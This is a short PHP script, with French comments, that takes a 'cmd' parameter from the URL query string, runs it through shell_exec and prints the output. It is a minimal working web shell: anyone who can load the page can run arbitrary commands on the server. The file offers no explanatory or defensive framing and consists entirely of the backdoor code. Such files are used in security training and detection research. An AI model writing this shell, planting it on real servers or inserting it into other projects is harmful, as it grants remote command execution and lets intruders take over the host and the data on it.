<?php
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];  // On récupère la commande à exécuter
    echo "<pre>" . shell_exec($cmd) . "</pre>";  // Exécution de la commande système
}
?>
